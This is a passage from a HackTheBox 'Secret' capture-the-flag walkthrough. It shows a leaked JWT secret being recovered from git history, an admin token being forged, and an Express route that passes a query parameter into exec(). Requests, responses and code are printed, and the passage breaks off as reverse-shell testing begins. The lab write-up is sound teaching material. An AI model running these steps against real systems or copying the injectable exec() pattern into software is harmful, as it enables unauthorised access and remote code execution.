+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──(legiahuyy㉿kali)-[~/Desktop/HTB/Boxes/Secret]
+</span></span><span style="display:flex;"><span>└─$ curl -i -H <span style="color:#87ceeb">&#39;Content-Type: application/json&#39;</span> -v 10.10.11.120/api/user/register --data <span style="color:#87ceeb">&#39;{&#34;name&#34;: &#34;legiahuyy&#34;}&#39;</span> 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>*   Trying 10.10.11.120:80...
+</span></span><span style="display:flex;"><span>* Connected to 10.10.11.120 (10.10.11.120) port <span style="color:#f60">80</span> (<span style="color:#0f0">#0)</span>
+</span></span><span style="display:flex;"><span>&gt; POST /api/user/register HTTP/1.1
+</span></span><span style="display:flex;"><span>&gt; Host: 10.10.11.120
+</span></span><span style="display:flex;"><span>&gt; User-Agent: curl/7.79.1
+</span></span><span style="display:flex;"><span>&gt; Accept: */*
+</span></span><span style="display:flex;"><span>&gt; Content-Type: application/json
+</span></span><span style="display:flex;"><span>&gt; Content-Length: <span style="color:#f60">19</span>
+</span></span><span style="display:flex;"><span>&gt; 
+</span></span><span style="display:flex;"><span>* Mark bundle as not supporting multiuse
+</span></span><span style="display:flex;"><span>&lt; HTTP/1.1 <span style="color:#f60">400</span> Bad Request
+</span></span><span style="display:flex;"><span>HTTP/1.1 <span style="color:#f60">400</span> Bad Request
+</span></span><span style="display:flex;"><span>&lt; Server: nginx/1.18.0 (Ubuntu)
+</span></span><span style="display:flex;"><span>Server: nginx/1.18.0 (Ubuntu)
+</span></span><span style="display:flex;"><span>&lt; Date: Wed, <span style="color:#f60">19</span> Jan <span style="color:#f60">2022</span> 15:23:38 GMT
+</span></span><span style="display:flex;"><span>Date: Wed, <span style="color:#f60">19</span> Jan <span style="color:#f60">2022</span> 15:23:38 GMT
+</span></span><span style="display:flex;"><span>&lt; Content-Type: text/html; <span style="color:#eedd82">charset</span>=utf-8
+</span></span><span style="display:flex;"><span>Content-Type: text/html; <span style="color:#eedd82">charset</span>=utf-8
+</span></span><span style="display:flex;"><span>&lt; Content-Length: <span style="color:#f60">18</span>
+</span></span><span style="display:flex;"><span>Content-Length: <span style="color:#f60">18</span>
+</span></span><span style="display:flex;"><span>&lt; Connection: keep-alive
+</span></span><span style="display:flex;"><span>Connection: keep-alive
+</span></span><span style="display:flex;"><span>&lt; X-Powered-By: Express
+</span></span><span style="display:flex;"><span>X-Powered-By: Express
+</span></span><span style="display:flex;"><span>&lt; ETag: W/<span style="color:#87ceeb">&#34;12-FCVaNPnXYf0hIGYsTUTYByRq5/U&#34;</span>
+</span></span><span style="display:flex;"><span>ETag: W/<span style="color:#87ceeb">&#34;12-FCVaNPnXYf0hIGYsTUTYByRq5/U&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>&lt; 
+</span></span><span style="display:flex;"><span>* Connection <span style="color:#0f0">#0 to host 10.10.11.120 left intact</span>
+</span></span><span style="display:flex;"><span><span style="color:#87ceeb">&#34;email&#34;</span> is required                                                                      
+</span></span></code></pre></div><p>Evidently, <code>/api/user/register</code> is a valid API endpoint and thus enables us to register a new user. Next, we want access to the two <code>/api/priv</code> and <code>/api/logs</code> route and it is feasible by modifying our user to <code>theadmin</code> as in <code>private.js</code>. Have a try spotting the vulnerable function in this code snippet.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#f00">const</span> router = require(<span style="color:#87ceeb">&#39;express&#39;</span>).Router();
+</span></span><span style="display:flex;"><span><span style="color:#f00">const</span> verifytoken = require(<span style="color:#87ceeb">&#39;./verifytoken&#39;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#f00">const</span> User = require(<span style="color:#87ceeb">&#39;../model/user&#39;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>router.get(<span style="color:#87ceeb">&#39;/priv&#39;</span>, verifytoken, (req, res) =&gt; {
+</span></span><span style="display:flex;"><span>   <span style="color:#0f0">// res.send(req.user)
+</span></span></span><span style="display:flex;"><span><span style="color:#0f0"></span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f00">const</span> userinfo = { name: req.user }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f00">const</span> name = userinfo.name.name;
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#f00">if</span> (name == <span style="color:#87ceeb">&#39;theadmin&#39;</span>){
+</span></span><span style="display:flex;"><span>        res.json({
+</span></span><span style="display:flex;"><span>            creds:{
+</span></span><span style="display:flex;"><span>                role:<span style="color:#87ceeb">&#34;admin&#34;</span>, 
+</span></span><span style="display:flex;"><span>                username:<span style="color:#87ceeb">&#34;theadmin&#34;</span>,
+</span></span><span style="display:flex;"><span>                desc : <span style="color:#87ceeb">&#34;welcome back admin,&#34;</span>
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        })
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#f00">else</span>{
+</span></span><span style="display:flex;"><span>        res.json({
+</span></span><span style="display:flex;"><span>            role: {
+</span></span><span style="display:flex;"><span>                role: <span style="color:#87ceeb">&#34;you are normal user&#34;</span>,
+</span></span><span style="display:flex;"><span>                desc: userinfo.name.name
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        })
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>})
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>router.get(<span style="color:#87ceeb">&#39;/logs&#39;</span>, verifytoken, (req, res) =&gt; {
+</span></span><span style="display:flex;"><span>    <span style="color:#f00">const</span> file = req.query.file;
+</span></span><span style="display:flex;"><span>    <span style="color:#f00">const</span> userinfo = { name: req.user }
+</span></span><span style="display:flex;"><span>    <span style="color:#f00">const</span> name = userinfo.name.name;
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#f00">if</span> (name == <span style="color:#87ceeb">&#39;theadmin&#39;</span>){
+</span></span><span style="display:flex;"><span>        <span style="color:#f00">const</span> getLogs = <span style="color:#87ceeb">`git log --oneline </span><span style="color:#87ceeb">${</span>file<span style="color:#87ceeb">}</span><span style="color:#87ceeb">`</span>;
+</span></span><span style="display:flex;"><span>        exec(getLogs, (err , output) =&gt;{
+</span></span><span style="display:flex;"><span>            <span style="color:#f00">if</span>(err){
+</span></span><span style="display:flex;"><span>                res.status(<span style="color:#f60">500</span>).send(err);
+</span></span><span style="display:flex;"><span>                <span style="color:#f00">return</span>
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>            res.json(output);
+</span></span><span style="display:flex;"><span>        })
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#f00">else</span>{
+</span></span><span style="display:flex;"><span>        res.json({
+</span></span><span style="display:flex;"><span>            role: {
+</span></span><span style="display:flex;"><span>                role: <span style="color:#87ceeb">&#34;you are normal user&#34;</span>,
+</span></span><span style="display:flex;"><span>                desc: userinfo.name.name
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        })
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>})
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>router.use(<span style="color:#f00">function</span> (req, res, next) {
+</span></span><span style="display:flex;"><span>    res.json({
+</span></span><span style="display:flex;"><span>        message: {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            message: <span style="color:#87ceeb">&#34;404 page not found&#34;</span>,
+</span></span><span style="display:flex;"><span>            desc: <span style="color:#87ceeb">&#34;page you are looking for is not found. &#34;</span>
+</span></span><span style="display:flex;"><span>        }
+</span></span><span style="display:flex;"><span>    })
+</span></span><span style="display:flex;"><span>});
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>module.exports = router
+</span></span></code></pre></div><p>In order to impersonate a privileged account, we have to know the aforementioned JWT secret key. Hence, our objectives:</p>
+<ul>
+<li>Register a new user credentials</li>
+<li>Use the secret key to impersonate <code>theadmin</code> then access <code>/logs</code></li>
+<li>Abuse <code>exec</code> and spawn a reverse shell</li>
+<li>Leverage to <code>root</code> and read the flag file</li>
+</ul>
+<h2 id="exploitation"><a class="h-anchor" href="#exploitation">Exploitation</a></h2>
+<h3 id="stage-1-commits-history-and-jwt-secret-key"><a class="h-anchor" href="#stage-1-commits-history-and-jwt-secret-key">Stage 1: Commits history and JWT secret key</a></h3>
+<p>Since we have already known that <code>/api/user/register</code> allows us to register any users as long as they are not duplicated, so let us send a POST request but this time, our request body must meet the required fields which consists of <code>email</code>, <code>name</code> and <code>password</code> as follows:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span>// Request
+</span></span><span style="display:flex;"><span><span style="color:#ff0">POST</span> /api/user/register <span style="color:#f00">HTTP</span>/<span style="color:#f60">1.1</span>
+</span></span><span style="display:flex;"><span>Host: 10.10.11.120
+</span></span><span style="display:flex;"><span>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
+</span></span><span style="display:flex;"><span>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+</span></span><span style="display:flex;"><span>Accept-Language: en-US,en;q=0.5
+</span></span><span style="display:flex;"><span>Accept-Encoding: gzip, deflate
+</span></span><span style="display:flex;"><span>Connection: close
+</span></span><span style="display:flex;"><span>Content-Type: application/json
+</span></span><span style="display:flex;"><span>Upgrade-Insecure-Requests: 1
+</span></span><span style="display:flex;"><span>If-None-Match: W/&#34;5d-ArPF0JBxjtRzy3wpSVF4hSVtK4s&#34;
+</span></span><span style="display:flex;"><span>Content-Length: 88
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>&#34;name&#34;: <span style="color:#87ceeb">&#34;legiahuyy&#34;</span>,
+</span></span><span style="display:flex;"><span>&#34;email&#34;: <span style="color:#87ceeb">&#34;legiahuyy@email.com&#34;</span>,
+</span></span><span style="display:flex;"><span>&#34;password&#34;:  <span style="color:#87ceeb">&#34;legiahuyy&#34;</span>
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#0f0">// Expected response
+</span></span></span><span style="display:flex;"><span><span style="color:#0f0"></span>HTTP/<span style="color:#f60">1.1</span> <span style="color:#f60">200</span> OK
+</span></span><span style="display:flex;"><span>Server: nginx/<span style="color:#f60">1.18</span>.<span style="color:#f60">0</span> (Ubuntu)
+</span></span><span style="display:flex;"><span>Date: Sat, <span style="color:#f60">22</span> Jan <span style="color:#f60">2022</span> <span style="color:#f60">10</span>:<span style="color:#f60">27</span>:<span style="color:#f60">17</span> GMT
+</span></span><span style="display:flex;"><span>Content-Type: application/json; charset=utf<span style="color:#f60">-8</span>
+</span></span><span style="display:flex;"><span>Content-Length: <span style="color:#f60">20</span>
+</span></span><span style="display:flex;"><span>Connection: close
+</span></span><span style="display:flex;"><span>X-Powered-By: Express
+</span></span><span style="display:flex;"><span>ETag: W/<span style="color:#87ceeb">&#34;14-5u6aWsQRyEf6xmQ3npU9EV403v8&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>{&#34;user&#34;:<span style="color:#87ceeb">&#34;legiahuyy&#34;</span>}
+</span></span></code></pre></div><p>Then we do the same to <code>/api/user/login</code> and feed it with the new credentials</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#ff0">POST</span> /api/user/login <span style="color:#f00">HTTP</span>/<span style="color:#f60">1.1</span>
+</span></span><span style="display:flex;"><span>Host: 10.10.11.120
+</span></span><span style="display:flex;"><span>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
+</span></span><span style="display:flex;"><span>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+</span></span><span style="display:flex;"><span>Content-Type: application/json
+</span></span><span style="display:flex;"><span>Accept-Language: en-US,en;q=0.5
+</span></span><span style="display:flex;"><span>Accept-Encoding: gzip, deflate
+</span></span><span style="display:flex;"><span>Connection: close
+</span></span><span style="display:flex;"><span>Upgrade-Insecure-Requests: 1
+</span></span><span style="display:flex;"><span>If-None-Match: W/&#34;5d-ArPF0JBxjtRzy3wpSVF4hSVtK4s&#34;
+</span></span><span style="display:flex;"><span>Content-Length: 63
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>&#34;email&#34;: <span style="color:#87ceeb">&#34;legiahuyy@email.com&#34;</span>,
+</span></span><span style="display:flex;"><span>&#34;password&#34;:  <span style="color:#87ceeb">&#34;legiahuyy&#34;</span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>and the server responses with a JWT string representing our user - <code>legiahuyy</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#f00">HTTP</span>/<span style="color:#f60">1.1</span> <span style="color:#f60">200</span> OK
+</span></span><span style="display:flex;"><span>Server: nginx/1.18.0 (Ubuntu)
+</span></span><span style="display:flex;"><span>Date: Sat, 22 Jan 2022 11:05:07 GMT
+</span></span><span style="display:flex;"><span>Content-Type: text/html; charset=utf-8
+</span></span><span style="display:flex;"><span>Connection: close
+</span></span><span style="display:flex;"><span>X-Powered-By: Express
+</span></span><span style="display:flex;"><span>auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWViZGMwNTBkMTdhMjA0NWQxNTI0MjQiLCJuYW1lIjoibGVnaWFodXl5IiwiZW1haWwiOiJsZWdpYWh1eXlAZW1haWwuY29tIiwiaWF0IjoxNjQyODQ5NTA3fQ.w2orsI3BE8gax-Ik167u_YhAOv4kwuSa-qDuqukEPvE
+</span></span><span style="display:flex;"><span>ETag: W/&#34;d7-wPhrTaCyHGE5zjXsMLs2pDjBFNk&#34;
+</span></span><span style="display:flex;"><span>Content-Length: 215
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWViZGMwNTBkMTdhMjA0NWQxNTI0MjQiLCJuYW1lIjoibGVnaWFodXl5IiwiZW1haWwiOiJsZWdpYWh1eXlAZW1haWwuY29tIiwiaWF0IjoxNjQyODQ5NTA3fQ.w2orsI3BE8gax-Ik167u_YhAOv4kwuSa-qDuqukEPvE
+</span></span></code></pre></div><p>A seemingly futile attempt was made to access <code>/api/priv</code> with the current token and yielded expected response informing our user does not have the specified role. Considering the following two code portions as they verify and grant us access to restricted endpoints, respectively:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#0f0">// verifytoken.js
+</span></span></span><span style="display:flex;"><span><span style="color:#0f0"></span><span style="color:#f00">const</span> jwt = require(<span style="color:#87ceeb">&#34;jsonwebtoken&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>module.exports = <span style="color:#f00">function</span> (req, res, next) {
+</span></span><span style="display:flex;"><span>    <span style="color:#f00">const</span> token = req.header(<span style="color:#87ceeb">&#34;auth-token&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#f00">if</span> (!token) <span style="color:#f00">return</span> res.status(<span style="color:#f60">401</span>).send(<span style="color:#87ceeb">&#34;Access Denied&#34;</span>);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f00">try</span> {
+</span></span><span style="display:flex;"><span>        <span style="color:#f00">const</span> verified = jwt.verify(token, process.env.TOKEN_SECRET);
+</span></span><span style="display:flex;"><span>        req.user = verified;
+</span></span><span style="display:flex;"><span>        next();
+</span></span><span style="display:flex;"><span>    } <span style="color:#f00">catch</span> (err) {
+</span></span><span style="display:flex;"><span>        res.status(<span style="color:#f60">400</span>).send(<span style="color:#87ceeb">&#34;Invalid Token&#34;</span>);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>};
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#0f0">// private.js
+</span></span></span><span style="display:flex;"><span><span style="color:#0f0"></span>...
+</span></span><span style="display:flex;"><span><span style="color:#0f0">// /api/priv route:
+</span></span></span><span style="display:flex;"><span><span style="color:#0f0"></span>    <span style="color:#f00">const</span> userinfo = { name: req.user }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f00">const</span> name = userinfo.name.name;
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#f00">if</span> (name == <span style="color:#87ceeb">&#39;theadmin&#39;</span>){
+</span></span><span style="display:flex;"><span>        res.json({
+</span></span><span style="display:flex;"><span>            creds:{
+</span></span><span style="display:flex;"><span>                role:<span style="color:#87ceeb">&#34;admin&#34;</span>, 
+</span></span><span style="display:flex;"><span>                username:<span style="color:#87ceeb">&#34;theadmin&#34;</span>,
+</span></span><span style="display:flex;"><span>                desc : <span style="color:#87ceeb">&#34;welcome back admin,&#34;</span>
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>        })
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span><span style="color:#0f0">// /api/logs route:
+</span></span></span><span style="display:flex;"><span><span style="color:#0f0"></span>    <span style="color:#f00">if</span> (name == <span style="color:#87ceeb">&#39;theadmin&#39;</span>){
+</span></span><span style="display:flex;"><span>        <span style="color:#f00">const</span> getLogs = <span style="color:#87ceeb">`git log --oneline </span><span style="color:#87ceeb">${</span>file<span style="color:#87ceeb">}</span><span style="color:#87ceeb">`</span>;
+</span></span><span style="display:flex;"><span>        exec(getLogs, (err , output) =&gt;{
+</span></span><span style="display:flex;"><span>            <span style="color:#f00">if</span>(err){
+</span></span><span style="display:flex;"><span>                res.status(<span style="color:#f60">500</span>).send(err);
+</span></span><span style="display:flex;"><span>                <span style="color:#f00">return</span>
+</span></span><span style="display:flex;"><span>            }
+</span></span><span style="display:flex;"><span>            res.json(output);
+</span></span><span style="display:flex;"><span>        })
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>...
+</span></span></code></pre></div><p>As the above snippet suggested, <code>auth-token</code> in our header request with its <code>TOKEN_SECRET</code> are to be verified, the request is then passed to <code>/api/priv</code> or <code>/api/logs</code> for a username comparison and we therefrom have access to the protected resources which are required for the later stage.</p>
+<p>Usually, when dealing with JWT, one of my favorites is <a href="https://JWT.io">JWT.io</a> because of its straightforward and friendly design but you can always have an alternative <a href="https://github.com/ticarpi/jwt_tool">CLI option</a> in case internet is not available or whatever your reason is. Anyway, we are going with the web version and conveniently paste the received token there.</p>
+<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2022-01-13-HTB-Secret/2022-01-22_21-35.png"></p>
+<p>In the previous enumeration step, we have known <code>.env</code> is from which to look for the secret key. Ergo, we can easily snatch it from the file yet that was just what I thought and consequently, it did take a plenty of time for me to figure out where the <em>original</em> one is. Try having a guess before you carry on to the solution.</p>
+<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2022-01-13-HTB-Secret/2022-01-25_09-49.png"></p>
+<p>And I expect you still remember the extracting process with GitTools in our initial enumeration as it now provides the original <code>TOKEN_SECRET</code>. With that in mind, let us skim through the dumped contents.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>┌──(legiahuyy㉿kali)-[~/Desktop/HTB/Boxes/Secret]
+</span></span><span style="display:flex;"><span>└─$ ls -l ./www/extracted 
+</span></span><span style="display:flex;"><span>total <span style="color:#f60">24</span>
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#f60">7</span> legiahuyy kali <span style="color:#f60">4096</span> Jan <span style="color:#f60">18</span> 21:55 0-4e5547295cfe456d8ca7005cb823e1101fd1f9cb
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#f60">7</span> legiahuyy kali <span style="color:#f60">4096</span> Jan <span style="color:#f60">18</span> 21:56 1-55fe756a29268f9b4e786ae468952ca4a8df1bd8
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#f60">7</span> legiahuyy kali <span style="color:#f60">4096</span> Jan <span style="color:#f60">18</span> 21:57 2-67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#f60">7</span> legiahuyy kali <span style="color:#f60">4096</span> Jan <span style="color:#f60">18</span> 21:58 3-de0a46b5107a2f4d26e348303e76d85ae4870934
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#f60">7</span> legiahuyy kali <span style="color:#f60">4096</span> Jan <span style="color:#f60">18</span> 21:59 4-e297a2797a5f62b6011654cf6fb6ccb6712d2d5b
+</span></span><span style="display:flex;"><span>drwxr-xr-x <span style="color:#f60">7</span> legiahuyy kali <span style="color:#f60">4096</span> Jan <span style="color:#f60">18</span> 22:00 5-3a367e735ee76569664bf7754eaaade7c735d702
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──(legiahuyy㉿kali)-[~/Desktop/HTB/Boxes/Secret]
+</span></span><span style="display:flex;"><span>└─$ cd ./www/extracted/0-4e5547295cfe456d8ca7005cb823e1101fd1f9cb     
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>┌──(legiahuyy㉿kali)-[~/…/Secret/www/extracted/0-4e5547295cfe456d8ca7005cb823e1101fd1f9cb]
+</span></span><span style="display:flex;"><span>└─$ cat .env                                                      
+</span></span><span style="display:flex;"><span><span style="color:#eedd82">DB_CONNECT</span> = <span style="color:#87ceeb">&#39;mongodb://127.0.0.1:27017/auth-web&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#eedd82">TOKEN_SECRET</span> = gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE
+</span></span></code></pre></div><p>Thanks to this, we now have the correct token to impersonate <code>theadmin</code>. As I have mentioned earlier, it is only necessary to modify <code>&quot;name&quot;</code>.</p>
+<p><img src="https://raw.githubusercontent.com/legiahuyy/image-host/main/2022-01-13-HTB-Secret/2022-01-26_16-05.png"></p>
+<p>We then can send a request to the <code>/api/priv</code> endpoint to test out the newly forged token using Burpsuite.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span>// Request
+</span></span><span style="display:flex;"><span><span style="color:#ff0">GET</span> /api/priv <span style="color:#f00">HTTP</span>/<span style="color:#f60">1.1</span>
+</span></span><span style="display:flex;"><span>Host: 10.10.11.120
+</span></span><span style="display:flex;"><span>User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
+</span></span><span style="display:flex;"><span>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+</span></span><span style="display:flex;"><span>Accept-Language: en-US,en;q=0.5
+</span></span><span style="display:flex;"><span>Accept-Encoding: gzip, deflate
+</span></span><span style="display:flex;"><span>Connection: close
+</span></span><span style="display:flex;"><span>Upgrade-Insecure-Requests: 1
+</span></span><span style="display:flex;"><span>Content-Length: 0
+</span></span><span style="display:flex;"><span>auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWYxMGU5ZTYzMmIwZDA0NjNjOWIzYzEiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImxlZ2lhaHV5eUBlbWFpbC5jb20iLCJpYXQiOjE2NDMxODc4NzV9.EXXnBwTvW4WzwgURoqOP27L0aDR8V1bZ-hVX84dxP90
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>// Expected response
+</span></span><span style="display:flex;"><span>HTTP/1.1 200 OK
+</span></span><span style="display:flex;"><span>Server: nginx/1.18.0 (Ubuntu)
+</span></span><span style="display:flex;"><span>Date: Wed, 26 Jan 2022 09:19:11 GMT
+</span></span><span style="display:flex;"><span>Content-Type: application/json; charset=utf-8
+</span></span><span style="display:flex;"><span>Content-Length: 76
+</span></span><span style="display:flex;"><span>Connection: close
+</span></span><span style="display:flex;"><span>X-Powered-By: Express
+</span></span><span style="display:flex;"><span>ETag: W/&#34;4c-bXqVw5XMe5cDkw3W1LdgPWPYQt0&#34;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>{&#34;creds&#34;:{&#34;role&#34;:&#34;admin&#34;,&#34;username&#34;:&#34;theadmin&#34;,&#34;desc&#34;:&#34;welcome back admin&#34;}}
+</span></span></code></pre></div><p>The response has confirmed our solution works successfully, do the same with <code>/api/logs</code> yields expected result:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span>// Request
+</span></span><span style="display:flex;"><span><span style="color:#ff0">GET</span> /api/logs <span style="color:#f00">HTTP</span>/<span style="color:#f60">1.1</span>
+</span></span><span style="display:flex;"><span>Host: 10.10.11.120
+</span></span><span style="display:flex;"><span>...
+</span></span><span style="display:flex;"><span>auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MWYxMGU5ZTYzMmIwZDA0NjNjOWIzYzEiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6ImxlZ2lhaHV5eUBlbWFpbC5jb20iLCJpYXQiOjE2NDMxODc4NzV9.EXXnBwTvW4WzwgURoqOP27L0aDR8V1bZ-hVX84dxP90
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>// Response
+</span></span><span style="display:flex;"><span>HTTP/1.1 500 Internal Server Error
+</span></span><span style="display:flex;"><span>Server: nginx/1.18.0 (Ubuntu)
+</span></span><span style="display:flex;"><span>Date: Wed, 26 Jan 2022 09:29:09 GMT
+</span></span><span style="display:flex;"><span>Content-Type: application/json; charset=utf-8
+</span></span><span style="display:flex;"><span>Content-Length: 77
+</span></span><span style="display:flex;"><span>Connection: close
+</span></span><span style="display:flex;"><span>X-Powered-By: Express
+</span></span><span style="display:flex;"><span>ETag: W/&#34;4d-xY8AsU/eUR22Yy/Fqfzp+1blTxU&#34;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>{&#34;killed&#34;:false,&#34;code&#34;:128,&#34;signal&#34;:null,&#34;cmd&#34;:&#34;git log --oneline undefined&#34;}
+</span></span></code></pre></div><p>More importantly, this endpoint also has a RCE functionality in the <code>file</code> parameter as heretofore spotted in <code>private.js</code>:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#0f0">// private.js
+</span></span></span><span style="display:flex;"><span><span style="color:#0f0"></span>...
+</span></span><span style="display:flex;"><span><span style="color:#f00">const</span> file = req.query.file;
+</span></span><span style="display:flex;"><span><span style="color:#f00">const</span> getLogs = <span style="color:#87ceeb">`git log --oneline </span><span style="color:#87ceeb">${</span>file<span style="color:#87ceeb">}</span><span style="color:#87ceeb">`</span>;
+</span></span><span style="display:flex;"><span>exec(getLogs, (err , output) =&gt;{
+</span></span><span style="display:flex;"><span>	<span style="color:#f00">if</span>(err){
+</span></span><span style="display:flex;"><span>	res.status(<span style="color:#f60">500</span>).send(err);
+</span></span><span style="display:flex;"><span>	<span style="color:#f00">return</span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h3 id="stage-2-remote-code-execution-to-reverse-shell"><a class="h-anchor" href="#stage-2-remote-code-execution-to-reverse-shell">Stage 2: Remote Code <em>Exec()ution</em> to reverse shell</a></h3>
+<p>Regarding the prior snippet, <code>exec()</code> takes a query parameter, <code>file</code>, from the HTTP request as its input without being sanitized or filtered; thus allows arbitrary code execution on the remote server. In case some of you may not be familiar with <em><a href="https://nodejs.org/dist/latest-v6.x/docs/api/child_process.html#child_process_child_process_exec_command_options_callback">exec</a></em>, the function basically executes the inputted buffer as a chain of commands separated by semi-colons on its hosting system.</p>
+<p>The viability of the RCE is then to be tested with basic commands, it is also necessary to check for any infamous utilities capable of spawning a reverse shell, like <em>netcat</em>, <em>curl</em>, <em>awk</em> and so on.</p>
